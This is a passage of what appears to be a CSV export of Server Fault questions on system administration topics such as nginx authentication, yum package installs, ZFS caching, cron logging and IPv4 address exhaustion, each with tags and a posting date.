"916819","10 years in system administration and yet can not contribute to serverfault","<p>Is it me silly or I am doing something wrong? I was constantly learning during my System administrator career, but when I review serverfault or superuser questions I find myself very difficult to help somebody with their problems. When I say that I was constantly learning I mean that I tried to troubleshoot each problem that came to me from users. I not only tried to fix it, but understand why the problem happened. Fixing the problem = reinstall Windows. Understanding the problem - finding fault module in Windows and replacing or repairing it.
Perhaps may be my problem is that I am eager to learn too much topics: Linux, networking, Windows, security and it make it difficult to become expert enough to answer questions on serverfault. Serverfault is interesting for me because of job opportunities and personal pride.</p>
","<linux><windows><security>","2018-06-15 11:33:20"
"1038534","How to stop my server from bruteforcing another","<p>There are so many resources on how to stop bruteforce attacks on your server, but I can't find any good on bruteforce attacks FROM a <strong>shared hosting</strong> server.</p>
<p>I am getting a lot of reports from many different providers that my servers is attacking theirs. Even after scanning with ClamScan and removing a whole lot of malware.</p>
<p>Is there an easy way to see which website(or script) on my server is calling, lets say, &quot;/wp-login.php&quot; on another server?</p>
","<linux><malware><shared-hosting><brute-force-attacks><sysadmin>","2020-10-13 11:54:15"
"916938","Google cloud submit shell script running on my instance","<p>In my <code>Debian</code> instance at Google Cloud, I want to know if there is a scheduler so that I can submit my shell script to run my program in my instance without having to keep the terminal open all the time.</p>

<p>Thank you</p>
","<google-cloud-platform><google-compute-engine>","2018-06-16 12:25:24"
"1038658","How to use remote app on local computer","<p>Hi is there any way that I can use any remote app on my local computer Using <code>RDP</code>, <code>CLI</code>, <code>web browser</code> or in any other way, I don't want to access remote PC directly I just want to access the Application, so that the application display on my Local Computer for example to run <code>notepad.exe</code> in <code>windows 10 , 7, server</code>.</p>
","<windows><windows-server-2012-r2><remote-desktop><remote><remoteapp>","2020-10-14 09:31:06"
"917024","Vmware ESXI 6.5: Is there a way to combine all 16 vcpus to form 4 vcpus which performs better","<p>I am not talking of overprovisioning of VCPUs. It's actually reverse. A way to combine all available threads to virtualize into a limited number of vcpus to get advantage of ESXI limitations.</p>

<p>I have to run a Single Virtual Machine on VMWARE ESXI 6.5 server. The server ships with 16 cores and 32 threads. </p>

<p>Vmware ESXI has a limitation of 8 vcpu per VM. Is there a way to combine all vcpus and allocate the entire CPU cores to the single VM which means 4 logical threads or 2 physical cores should be mapped to a single vcpu.</p>

<p>I am running an application on top of the VM which does not run on a Physical machine and needs to be hosted on a VSXI Hypervisor.</p>
","<vmware-esxi><hypervisor>","2018-06-17 17:14:58"
"1038693","how to print lists inside tuple in python","<p>i got lists inside a tuple. At least i think thats what i have (i did not code it):
<code>nvts = {&quot;high&quot;: [], &quot;medium&quot;: [], &quot;low&quot;: [], &quot;log&quot;: []}</code>
I want to print the values inside &quot;high&quot;, &quot;medium&quot; etc.</p>
<p>i tried a for-loop:
<code>for a, *b in nvts:</code>
<code> print(a, ' '.join(map(str, b)))</code></p>
<p>but it gives me as an output:
<code>h i g h</code>
<code>m e di u m ...</code></p>
<p>Can someone help me with the correct print?</p>
<p>best regards</p>
","<python>","2020-10-14 14:01:19"
"1038826","How to block all traffic to my server that are connecting using my IP instead of my domain name?","<p>I have fedora server, i want any connection to use my server domain name or otherwise be blocked.. I don't mind if i use iptables (or csf) or if not then through apache configs.</p>
","<linux><apache-2.2><iptables>","2020-10-15 13:11:10"
"917175","Enable Nginx authentication for a specific URL","<p>I'm working with a control panel, and I need to put an authentication in admin access.</p>

<p>I already created the user and password, the configuration of nginx this way:</p>

<pre><code>server {
listen 443 ssl;
server_name localhost;
root /usr/local/pannel/www;

gzip on;
gzip_http_version  1.1;
gzip_comp_level    5;
gzip_min_length    256;
gzip_proxied       any;
gzip_vary          on;

gzip_types
  application/atom+xml
  application/javascript
  application/json
  application/rss+xml
  application/vnd.ms-fontobject
  application/x-font-ttf
  application/x-web-app-manifest+json
  application/xhtml+xml
  application/xml
  font/opentype
  image/svg+xml
  image/x-icon
  text/css
  text/plain
  text/x-component;

ssl_certificate     /usr/local/svmstack/nginx/ssl/ssl.crt;
ssl_certificate_key /usr/local/svmstack/nginx/ssl/ssl.key;
ssl_session_timeout 6m;
ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
ssl_ciphers         HIGH:!aNULL:!MD5;
ssl_prefer_server_ciphers on;

index index.php;

include services/custom/legacy-master-before-php-location-443.conf;

location ~ \.php$ {
    include services/custom/legacy-master-inside-php-location-443.conf;
    try_files $uri =404;
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_read_timeout 3600;
    fastcgi_pass unix:/usr/local/svmstack/fpm/socket/web.sock;
    fastcgi_index index.php;
    include fastcgi.conf;
    fastcgi_param HTTPS $https;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
include services/custom/legacy-master-after-php-location-443.conf;
}
</code></pre>

<p>I could simply add the code below into <code>location</code>, however in that case it would request authentication for all files in the <code>/usr/local/pannel/www;</code> folder.</p>

<pre><code>auth_basic ""Restricted"";
auth_basic_user_file /usr/local/pannel/htpasswd;
</code></pre>

<p>How can I create a new location, within the same key, for a specific URL, in which case the file is located at: <strong>/usr/local/pannel/www/admin/login.php</strong></p>

<p>I need authentication to be requested only when this file is accessed (login.php).</p>
","<nginx><centos><htpasswd><solusvm>","2018-06-18 20:38:29"
"1038832","Best way to organize google cloud VMs","<p>I am currently developing many wordpress websites and I'm starting to use Google Cloud to host my websites.
I've thought of a way to organize my websites, however I would like to know from the community if there is a way to improve it or maybe rearrange everything (I'm still in the beginning of the project so starting from scratch is an option).</p>
<p>The way that I'm organizing is I create a project for each kind of website that I create (e-commerce, institutional websites...) and in each project I create the Virtual Machines that host each website.</p>
<p>Here is and exemple of how I'm doing it :</p>
<p>Folder: Copany name</p>
<pre><code>    Project 1: E-commerce
       website 1, website 2, website 3...

    Project 2: Institutional
       website 1, website 2, website 3...
</code></pre>
","<google-cloud-platform>","2020-10-15 13:52:37"
"917192","RHEL 7.5 Cannot Yum install from text file","<p>I cannot figure out why installing packages listed in a text file with Yum wouldn't work but for some reason it does not. Yum cycles through all the listed package names and and lists them as available but at the end it shows the last package as installed with ""Nothing to do"". There has to be a way of doing this.  I tried the following:</p>

<pre><code>yum -y install $(/tmp/installs.txt)
yum install -y $(awk '{printf(""%s "",$1)}' /tmp/installs.txt)
for i in $( /tmp/installs.txt);do yum install $i -y;done
yum install `cat /tmp/installs.txt | tr '\n' ' '`
yum install $(cat /tmp/BSTNinstalls.txt)
</code></pre>

<p>Is this not allowed in Redhat or is there another way to go about this? </p>
","<bash><redhat><yum><rpm>","2018-06-18 23:37:30"
"917206","Renewal price of “Domain & Hosting”","<p>What if my website domain had a huge <strong>traffic</strong> and <strong>high ranking</strong>. is there are any chances for price increase over normal rates after 1 year , at <strong>renewal</strong> time ?. is there any hosting site provide <strong>same rate</strong> for ""domain renew &amp; hosting "" as many years as we want to host? </p>
","<domain-name-system><domain><hosting><web-hosting>","2018-06-19 04:42:20"
"917224","Is it possible to use powerline adapters behind UPS's?","<p>Currently i have my router connected in the 1st floor (with some switches), which is also connected with a 1200Mbps (real bandwith is about 600Mbps) powerline adapter.
Another powerline adapter is in my basement; also the main server is there. </p>

<p>I have bought two UPS devices (one for the router and the main switch, one for the server), which should provide power in case of a power failure.</p>

<ul>
<li><p>Since the powerline adapters require power to run, is it possible, to use them <em>behind</em> each UPS?</p></li>
<li><p>If it is possible, how does this affect the bandwith?</p></li>
</ul>

<p>If relevant: The powerline devices are ""TP-Link AV1200"".</p>
","<networking><bandwidth><ups>","2018-06-19 06:46:41"
"969708","Desktop To Command Line Toggle for Default Command Line Environment?","<p>[Fedora 30 Webserver] I am wanting to use MySQL Workbench and Wireshark (amongst other things) on my server, but neither of those two programs can be made to work on the command line; so what I am wondering is whether or not there is anything that I could install that would allow me to toggle back and forth between a pseudo-desktop environment and command-line in order to run them?</p>

<p>I have good reasons for prefering the command line, only a 14"" screen on the webserver (laptop) and do not want to be using VNC or installing a full desktop environment on the web server laptop if at all avoidable.</p>
","<command-line-interface><fedora><desktop>","2019-05-31 19:40:08"
"1039058","Disable upstream response buffering nginx","<p>Nginx keeps logging below message on my error log</p>
<blockquote>
<p>[warn] 16387#16387: *1117 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/1/32/0000000321 while reading upstream, client: 173.245.54.175, server:</p>
</blockquote>
<p>this fills up my log files , i want to disable buffering completely ,</p>
<p>i've tried turning proxy_buffering <code>proxy_buffering off;</code> but the logs keeps showing that nginx/fastcgi is buffering responses</p>
<p>How do i turn off buffering all together ?</p>
","<nginx>","2020-10-17 05:34:57"
"969795","H.264 not streaming over dynamic DNS","<p>I'm trying to view a network camera remotely so I registered with a dynamic DNS service. I can access the camera fine on the DNS associated URL and stream using MPEG but when I switch to H.264, the stream fails.</p>

<p>What's odd is I can stream H.264 if I use the local ip address. So the failure here is only occurring when streaming H.264 using the dynamic DNS address rather than the local ip.</p>

<p>I can't imagine why this would be. Would anyone have any insight?</p>
","<domain-name-system><dns-hosting><video-streaming><h.264>","2019-06-01 19:58:41"
"1039086","Is it possible to connect to MySQL which is in the Cloud Run container remotely?","<p>Is it possible to connect to MySQL which is in the Cloud Run container remotely?</p>
<hr />
<p><strong>Details</strong></p>
<pre><code>Server 1 (slave server) - I have a Docker container (in Google Cloud Run) with MySQL-Server in it.
   |
   |
   |
Server 2 (main server) - I want to connect to MySQL via PHP.
</code></pre>
<p>Is it possible to do this?</p>
<p>P.s</p>
<hr />
<p>I trying it to do, but I can not.</p>
","<google-cloud-platform>","2020-10-17 12:07:31"
"917392","Is it possible to find the physical location of someone connected to a wifi","<p>I suppose the question is in the title, is it possible to find the physical location of someone connected to a wifi network.</p>

<p>Say two people are connected on the same network, can one of them know where the other is exactly, im not looking for how to do it answer, just if it possible and some general information on the matter.</p>
","<wifi>","2018-06-20 01:35:51"
"917393","I can not access Http Server on Amazon EC2 Instance","<p>It can be so easy. But I can not it.</p>

<p>I run a http server on my EC2 server. And I can access it through localhost.</p>

<p><a href=""https://i.sstatic.net/1pbVG.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/1pbVG.png"" alt=""enter image description here""></a></p>

<p>My Inbound rules:</p>

<p><a href=""https://i.sstatic.net/ppkFY.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ppkFY.png"" alt=""enter image description here""></a></p>

<p>And my http request with Public DNS (IPv4):</p>

<p><a href=""https://i.sstatic.net/RoK8Q.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/RoK8Q.png"" alt=""enter image description here""></a></p>

<p>What is the missing?</p>
","<amazon-web-services><amazon-ec2>","2018-06-19 21:48:47"
"969878","VPS or Cloud Hosting, which is the most suitable for me?","<p>I have an institutional site and an API to communicate a PostgreSQL database with a web system and an application in React Native. The web system, the API, the database, and the institutional site must be hosted. The system is to administer a condominium, so at first it will not have many accesses, but this can increase. For me, would a VPS or Cloud Hosting be better? In case of VPS, what minimum configuration should it have, given the situation?</p>
","<vps><hosting><cloud>","2019-06-03 02:11:44"
"1039218","Is there an online service for checking the health of online services?","<p>I have a web service in Amazon WS on port 443. Is there an online service that can monitor my service and email me if, for example, <a href=""https://myservice.org"" rel=""nofollow noreferrer"">https://myservice.org</a> returns an error?</p>
","<healthcheck>","2020-10-18 21:05:08"
"1039229","Purchasing a domain name and pointing to a dynamic IP","<p>I designed a small hardware device that will need to periodically check for updates over wifi. I am looking into getting a proper domain name, as currently I am using one of the free ones from noip that requires confirming every 30 days.</p>
<p>The free domain from noip works well as my modem/router has support for their services built in. Looking through their site, it's not immediately evident if purchasing a top level domain will allow me to have it updated when my IP changes as the free one does.</p>
<p>I am wondering if I am comparing apples with oranges here... Is the &quot;free hostname&quot; the same as a paid domain name in terms of supporting dynamic dns?</p>
<p>When I look into their &quot;<a href=""https://www.noip.com/remote-access"" rel=""nofollow noreferrer"">enhanced dynamic dns</a>&quot; service, I still have to pick from a list of subdomains, I can't seem to enter my own .org. Then when I click on the <a href=""https://www.noip.com/domains"" rel=""nofollow noreferrer"">&quot;domains&quot; service</a>, I can enter exactly the domain name I would like.</p>
<p>What am I missing?</p>
","<domain-name-system><ddns>","2020-10-19 01:25:19"
"969988","Server Folder Permission Security Standards","<p>I'm a hapless newbie front end dev who has inherited a tangled nightmare of a website that has been cowboy coded for several years. The web host found an infected PHP file which has been removed and so I've been asked to look into security and to ""go through the folders and ensure that none have overly generous permissions"". The only experience I have with this is a month long process of destroying my local apache permissions on my linux laptop so I'm quite hesitant to mess with this. Forgive me if this question is not specific enough but unfortunately I'm so out of my league that I dont even know what to ask google so I am hoping some of you can either . . .</p>

<p>1 ) provide me with a checklist of things to look for regarding folder permission security </p>

<p>2 ) point me to an article or phrase that will help me do more precise research</p>

<p>3 ) point me to a tool that scans this for me</p>

<p>or</p>

<p>4 ) tell me I'm in over my head and that I'm not going to be able to ensure that our site is secure with a couple days of googling </p>

<p>Thanks!</p>
","<permissions>","2019-06-03 20:00:56"
"1039289","Xampp/PHPMyAdmin login issues","<p>i know there are many topics and i read at least 40 of it, but none solved my Problem.. I can login to PHPMyAdmin only from the machine its running on... On others there is just an &quot;Access denied&quot;. I created a new User with Hostname &quot;%&quot;. And i can login with it.</p>
<p>But noone else. They all get that @localhost added, which obviously cant work.</p>
<p>If i change the &quot;host&quot; in the &quot;config.inc.php&quot; to my IPv6 Adress or a dyndns, it adds my fritz.box name instead of &quot;localhost&quot; to it. If i put the fritz.box name in the URL of my browser, i see the dashboard from Xampp, but PHPmyAdmin still gets Access denied.. Im out of ideas, what to search, what to try...</p>
<p>What else can i do?</p>
<p><a href=""https://i.sstatic.net/nSIx6.png"" rel=""nofollow noreferrer"">User creation</a>
<a href=""https://i.sstatic.net/5Kscf.png"" rel=""nofollow noreferrer"">Config File</a></p>
","<phpmyadmin>","2020-10-19 13:01:43"
"917683","How can I force drop a finite number of connections in Linux?","<p>I want to be able to just force drop a bunch of connections if a server has too many connections. </p>
","<linux><linux-networking>","2018-06-21 17:12:40"
"970182","Mounted device taking up space on Ubuntu","<p>I have an Ubuntu based Droplet on DigitalOcean which has 25GB of Storage. I am using it to run Backups from 2 different Machines. </p>

<ul>
<li><p>Backup 1 is going to /home/server1/ (should have a total of 25GB of
disk available)</p></li>
<li><p>Backup 2 is goint to /mnt/volume_sgp1_01/server2/ (this should be the VOLUMES part
of 200GB)</p></li>
</ul>

<p>Since 25GB are not enough for my scope I have added a VOLUMES plan, which gave me an additional 200GB on a mounted drive, the problem now however seems that the mounted device also takes up space on the main droplet. Here an example:</p>

<pre><code>    4.0K    lib64
    4.0K    media
    4.0K    opt
    4.0K    srv
    8.0K    snap
    16K     lost+found
    32K     root
    40K     tmp
    608K    run
    5.3M    etc
    15M     bin
    15M     sbin
    76M     boot
    171M    lib
    855M    usr
    1.3G    var
    6.5G    home
    14G     mnt
    23G     total
</code></pre>

<p>The 14GB of mnt seem to be used / allocated on my Droplet as well, however that should not be the case.</p>

<p>I have added the SPACES (mnt) using the original instructions being:</p>

<pre><code>    # Create a mount point for your volume:
    $ mkdir -p /mnt/volume_sgp1_01

    # Mount your volume at the newly-created mount point:
    $ mount -o discard,defaults,noatime /dev/disk/by-id/scsi-0DO_Volume_volume-sgp1-01 /mnt/volume_sgp1_01

    # Change fstab so the volume will be mounted after a reboot
    $ echo '/dev/disk/by-id/scsi-0DO_Volume_volume-sgp1-01 /mnt/volume_sgp1_01 ext4 defaults,nofail,discard 0 0' | sudo tee -a /etc/fstab
</code></pre>

<p>I am not really a LINUX expert, however I think there is definately something wrong here, perhaps I mounted it incorrectly or why is mnt using up disk space on my 25GB? Some expert help would be really appreciated. Thank you!</p>
","<linux><ubuntu><digital-ocean>","2019-06-05 08:58:18"
"970187","Send AWS new feature announcement to Slack channel","<p>I would like to send the aws new featured announcement from <a href=""https://aws.amazon.com/new"" rel=""nofollow noreferrer"">https://aws.amazon.com/new</a> to a channel in Slack.
I couldn't find any source in google. Is there anyone who knows how that can be done?</p>
","<amazon-web-services>","2019-06-05 09:16:44"
"917820","Exchange hybrid mail flow","<p>I have successfully installed and configured exchange 2016 for a hybrid setup in my organization mail flow is up and running for all scenarios except from on-premises to o365.
Every other flow works fine. 
Is there anything I need to do?</p>
","<exchange><exchange-2016><exchange-hybrid>","2018-06-22 16:04:32"
"970209","How much is too much (processes, threads)","<p>I wonder if I have too much processes and if systemd is getting overloaded. When I run <code>ps aux | wc -l</code> O get ""840"" If I run <code>ps -e H | wc -l</code> I have around 5k (5128 to be exact), substracting the process count, this makes around 4288 threads. Is this too much for ubuntu and how can I know if systemd is overloaded for example?
On this server environment I have 48 cores and 128gb RAM.</p>
","<linux><threads><limits>","2019-06-05 11:48:34"
"970237","ZFS L2ARC at no expense","<p>I recently upgraded my workstation's SSDs, so now I have 2x256GB SSDs laying around. I am considering to use them as L2ARC disks on my NAS.</p>

<p>However my NAS has only 12GB of RAM and 8TB worth of disk space (5x2TB in RAID-Z). I've read that having L2ARC in low end servers might hurt performance instead of improving it, because it consumes 1-2GB of ARC per 100GB of L2ARC. If this is true it would mean that 10GB of 12GB available would be wasted, right?</p>

<p>Another thing I've considered is using one of the SSDs as a ZIL disk. The NAS shares stuff with my workstation though NFS (over a infiniband connection). I've read that NFS will benefit greatly from having ZIL, although the share is mounted with ""async"" option. However I think this is a impractical approach, as 256GB is way bigger than the 1-2GB recommended.</p>

<p>Is there a way to create a pool of both SSDs and use part of it as ZIL and another part for L2ARC? What other solution would you recommend?</p>

<p>PD: The server is mainly used by me. I have both a lot of media and back-ups (Large files uncommonly accesed). And college stuff (Small files commonly used and rewritten). It rarely has some more users that access photos over WAN, so not a serious bandwidth concern.</p>
","<linux><nfs><zfs><zfs-l2arc>","2019-06-05 14:05:00"
"917923","Cron logs aren't present in /var/log/syslog","<p>I have a cron task with ""printf"":</p>

<pre><code>#!/bin/bash

# ..........
printf ""hello\n""
# ..........
</code></pre>

<p>It runs once in N hours. However, in <code>/var/log/syslog</code> I don't see any logs with ""hello"" at all. Why not?</p>
","<linux><logging><cron>","2018-06-23 16:50:46"
"970330","function that ssh's to different server routed through local computer","<p>I can ssh to multiple servers but once I've reached one of them, I can't ssh to the next I have to go back to my local machine and then ssh to the next server. I would like to set up a script that lives on each these servers that can exit and then ssh to the next arbitrary server. I've tried setting up an alias for this.</p>

<p>like so:
alias host2=""exit; ssh host2;""</p>

<p>that didn't get me anywhere, Then I spent a long time looking into the localcommand config for ssh and I don't think that can help me either. Most recently I've been looking into writing a script that suspends the ssh instance and drops you local again, but I can't seem to get the formatting right for echoing  ~ ^Z. Even if I could I'm not sure it would help. Now my only thought is that maybe the remote server could scp the host name to a shared location and once back I could check that file if it has anything I use that as my next server. But I'm guessing there is a way easier way. 
Anyways any ideas or insights would be much appreciated thank you! </p>
","<ssh><bash>","2019-06-06 08:02:09"
"970450","Accidentally I deleted my instance-1","<p>I accidentally deleted my instance-1 along with the boot disk, I would like to know if it is possible to recover in any way, considering that I used it as a server and I have a very important database for me, I have looked everywhere for some reverse the process, but I was not successful, the only thing I found, was the record of the exclusion, but there is no option to reverse the process, could you help me with this question?</p>
","<google-compute-engine>","2019-06-06 19:50:04"
"970484","VPN into company office to view website","<p>I'm trying to move my morning remote office to a coffee shop. The website we are working on at the moment requires my IP address be added in the <code>apache configurations</code>. I know we have VPN (which ive only used sparingly). If i log into VPN (openVPN) from a coffee shop can i access the website without having to use the coffee shop IP added into <code>apache</code>? Im currently just at an IP that has the IP stored, no VPN</p>
","<vpn><openvpn>","2019-06-07 03:25:08"
"970507","Quota 'GPUS_ALL_REGIONS' exceeded. Limit: 0.0 globally","<p>I am trying to create the VM instance with NVIDIA K80 GPUs in Asia-East1 so, I requested to increase the quota and team have adjusted the quota. However, when I am trying to create the VM instance by selecting the NVIDIA K80 GPUs with 4 CPUs and Windows 2019 server, I am getting an error ""Quota 'GPUS_ALL_REGIONS' exceeded. Limit: 0.0 globally."". Please can you look into this issue and provide the solution.</p>

<p>Thanks &amp; regards,
Tushar</p>
","<google-compute-engine><gpu>","2019-06-07 07:56:20"
"970520","How to learn Linux system internals","<p>Recently I tried to apply for some DevOps Engineering positions, but I got scared about a specific requirement that was present in almost every job description:</p>

<p><strong>Experience with Linux internals and administration.</strong></p>

<p>I am working with Linux servers and applications deployed in Linux/Unix for quite some time and honestly, I have no idea what they meant by ""Experience with Linux internals"".  </p>

<p>My questions are: </p>

<ul>
<li>why should I know Linux internals?</li>
<li>where I can find practical use of this?</li>
<li>how to learn Linux internals?</li>
</ul>

<p>Thx</p>
","<linux><operating-system>","2019-06-07 09:17:24"
"918245","Two salts, One password","<p>If I have two different MD5 password hashes with two different salts (the salts are known), is there any way to cryptographically deduce if the two passwords match? Other than brute force password cracking, that is.</p>
","<cryptography><md5>","2018-06-26 09:52:10"
"970533","RabbitMQ management console not accessible on Windows Server 2016 http://localhost:15672/","<p>I have finished installing RabbitMQ on Windows Server 2016, and service is running and plugins are installed however i cannot access the RabbitMQ Management Console. Can someone please assist on what could be the cause?</p>
","<rabbitmq>","2019-06-07 10:35:40"
"918251","Wordpress - Non-www URL redirect to www using .htaccess file","<p>I want to redirect non-www URL to www URL in WordPress.</p>

<p>I added code for the redirect but I see that I only redirect URL internally but not accessible from the externally. I redirect to apache default page</p>

<p>I added coed in <code>.htaccess</code>.</p>

<pre><code>&lt;IfModule mod_rewrite.c&gt;
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^www\. [NC]
    RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]
&lt;/IfModule&gt;
</code></pre>

<p>Not work externally. I also set www in secure/non-secure URL.</p>

<p>Does have any solution?</p>
","<apache-2.2><.htaccess><redirect><wordpress>","2018-06-26 10:07:59"
"918370","VMware virtual machine 12 change hostname","<p>Is there a setting from the VMware virtual machine version 12 to change the name of the machine(hostname) ,I am booting Linux Suse 12.3</p>
","<vmware-workstation><opensuse><sles>","2018-06-26 20:05:37"
"918414","How to save the converted file to another system by ffmpeg","<p>i want to developing a service of online converter in local network by ffmpeg.</p>

<p>the service receives address of file to converting and output address for put converted file to it.</p>

<p>can ffmpeg do saving output file in another system in local network ?</p>

<p>or i must first saving output file and then moving to another system ?</p>
","<remote-access><ffmpeg><convert><conversion>","2018-06-27 06:38:58"
"843127","imagemagic: extract bitmap images as-is from PDF","<p>I know how to use imagemagick's <code>convert</code> to render the PDF and generate new images from the PDF page, including both the bitmaps and the vector images rendered on the desired resolution.</p>

<p>But, the problem with that approach is that the bitmap images are re-sampled to the new resolution. What i'd like to be able to do is to extract the bitmap images exactly as they are stored in the PDF.</p>

<p>I want this to improve contrast on scanned PDFs, where the PDFs are nothing more than an archive for the bitmap images. E.g. <a href=""http://www.datamath.net/Manuals/TI-66_Manual_US.pdf"" rel=""nofollow noreferrer"">http://www.datamath.net/Manuals/TI-66_Manual_US.pdf</a></p>

<p>I'd want the very first step to be just to extract the as-original-as-possible bitmaps from the PDF.</p>

<p>Note: I am limiting this to imagemagick so that the solution is portable. But if you know the same can be done with unix tools as common as imagemagick is, please do share!</p>
","<imagemagick><pdf>","2017-04-06 21:47:01"
"918637","raid 5 over 12 disks and failed two hard can rebuild","<p>i have installed 12 hard drives 4 TB Black Caviar make raid 5 and suddenly failed two drives at same time can rebuild raid if i replace failed drives with new drives. my data is still available  or not data is very important.</p>
","<dell-perc>","2018-06-28 10:39:26"
"1040493","how to turn on Server power supply Lite-ON model PS-2122-8L1 without server chassis","<p>I wanted build 48v DC power from 4 12v power supply units. Eventually i got my hands on Lite-On PS-2122-8L1 server psu. But after getting it, i am still unable power it on with out chassis. i mean i dont have a server, But i want to power it for my battery projects and also to smart chargers to deliver high power.</p>
<p>i tried shorting,adding resistor to pin 33 and one more pin which is soldered, like for HP psus but i think this has 8 small pins both top and bottom.
<a href=""https://i.sstatic.net/do4zT.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/do4zT.jpg"" alt=""Top Pins"" /></a>
<a href=""https://i.sstatic.net/Dt9ro.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Dt9ro.jpg"" alt=""Bottom Pins"" /></a></p>
<p>So anybody can help me power this thing up. Or can provide output connector pinouts, Circuit diagram etc., anything related which helps me in powering this PSU.</p>
<p>I have attached some pictures of the power supply. Let me know aything related to it.
<a href=""https://i.sstatic.net/MeB6G.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/MeB6G.jpg"" alt=""enter image description here"" /></a>
<a href=""https://i.sstatic.net/YZnfV.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/YZnfV.jpg"" alt=""enter image description here"" /></a>
[<img src=""https://i.sstatic.net/UhLWw.jpg"" alt=""enter image description here"" /><a href=""https://i.sstatic.net/UhLWw.jpg"" rel=""nofollow noreferrer"">5</a>
<a href=""https://i.sstatic.net/x3CEd.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/x3CEd.jpg"" alt=""enter image description here"" /></a>
<a href=""https://i.sstatic.net/Syql8.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Syql8.jpg"" alt=""enter image description here"" /></a></p>
<p>Thank you all..</p>
","<power-supply-unit>","2020-10-29 09:44:22"
"1040540","Is there a global shortage of IP addresses or not?","<p>This is bugging me a bit, so would like some help.  Here's some data I've gathered:</p>
<p>Apparently, an IPv4 address can range from 0.0.0.0 through to 255.255.255.255, providing up to 4,294,967,296 unique IPv4 addresses, although according to this article there are only 3.7 billion usable addresses: <a href=""https://www.ciscopress.com/articles/article.asp?p=348253&amp;seqNum=7#:%7E:text=IPv4%20uses%2032-bit%20IP,than%20the%20theoretical%20maximum%20number"" rel=""nofollow noreferrer"">https://www.ciscopress.com/articles/article.asp?p=348253&amp;seqNum=7#:~:text=IPv4%20uses%2032-bit%20IP,than%20the%20theoretical%20maximum%20number</a>.</p>
<p><a href=""https://i.sstatic.net/Gf5r0.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Gf5r0.png"" alt=""enter image description here"" /></a></p>
<p>This website: <a href=""https://www.statista.com/statistics/617136/digital-population-worldwide/"" rel=""nofollow noreferrer"">https://www.statista.com/statistics/617136/digital-population-worldwide/</a> - says that almost 4.57 billion people were active internet users as of July 2020.  So all these users are allocated IP addresses on their handhelds and / or PC's, as well as other devices included in the IOT, from security cameras to servers, from Raspberry Pi's to cluster nodes.</p>
<p>Wikipedia - <a href=""https://en.wikipedia.org/wiki/IPv4_address_exhaustion"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/IPv4_address_exhaustion</a> - says that the IPv4 addresses were exhausted back in 2011, and also indicates that some IOT devices may use IPv6 inherently.</p>
<p>The APNIC details are helpful: <a href=""https://www.apnic.net/manage-ip/ipv4-exhaustion/"" rel=""nofollow noreferrer"">https://www.apnic.net/manage-ip/ipv4-exhaustion/</a> - where they define the running out of IPv4 as the free pool running out, and that businesses would have reserved IP's that they can still hand out.  The charts on this page say that today, only 0.25% IP addresses are left.  I understand this to mean that some IP addresses were reclaimed successfully as described in the Wikipedia article.</p>
<p><a href=""https://i.sstatic.net/fgZRI.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/fgZRI.png"" alt=""enter image description here"" /></a></p>
<p>What made me look into this was that I recently migrated my websites from Siteground to Dreamhost.  Siteground use cPanel, meaning each user only gets a single IP address allocated to them, and cPanel works out where all the different subdomains / add-on domains end up.  Dreamhost, however, allocates 2 IP addresses for each domain, subdomain, and add-on domain that is hosted with them, which seemed odd as I've heard a lot about how scarce IPv4 addresses are.  I've got about 10 websites with them so 20 IP addresses as opposed to just the one I had with Siteground.</p>
<p>So I'm confused as to whether IPv4 addresses are going to run out or not.</p>
<ul>
<li>I've never used an IPv6 address in my life.</li>
<li>Dreamhost are giving away IPv4 addresses as if they can't get rid of them fast enough.</li>
<li>The world population is constantly growing, as is the amount of internet hosts connected to the internet.</li>
<li>Wikipedia says that we ran out of IPv4 in 2011, yet I can still get new ones. (Because Dreamhost already owns them?)</li>
<li>There's a lot of sources on the internet discussing the shortage, and the move to IPv6.</li>
</ul>
<p>What's going on here?</p>
<ul>
<li>Is there any way to tell how many delegated IP's are actually in use?</li>
<li>Why would Dreamhost or anyone else give away so many IP's if they're as valuable as they seem?</li>
<li>How close are we to using IPv6 globally and will IPv4 be deprecated when it's globally in use?</li>
<li>According to this question <a href=""https://superuser.com/questions/768067/why-are-we-still-stuck-on-ipv4-when-we-are-ipv6-ready#768086"">https://superuser.com/questions/768067/why-are-we-still-stuck-on-ipv4-when-we-are-ipv6-ready#768086</a> IPv6 and IPv4 are not cross compatible so how does the implementation of IPv6 help the IPv4 situation?</li>
<li>If we're so close to running out, what is actually being done about it - surely it won't be long before this happens?</li>
<li>And furthermore, what on earth would actually happen if we finally run out of IPv4 completely?  Would it cause security issues or prevent people accessing the internet?</li>
</ul>
<p>Sorry for all the questions but none of this seems to make logical sense!</p>
","<ip><ipv6><ipv4>","2020-10-29 16:07:48"
"1040571","network interface packets count vs bytes","<p>I am looking at RX and TX stats taken from my ADSL modem/router (DLink DSL-2750B).</p>
<p>I can't figure out how to make sense of the RX/TX packets vs RX/TX bytes.</p>
<pre><code>br0             Link encap:Ethernet  HWaddr 6C:72:20:FC:AC:FE
          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: fe80::6e72:20ff:fefc:baef/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:47818791 errors:0 dropped:0 overruns:0 frame:0
          TX packets:76577323 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:11029761868 (10.2 GiB)  TX bytes:75743327574 (70.5 GiB)
</code></pre>
<p>Looking at packets stats, RX is about 2 times TX
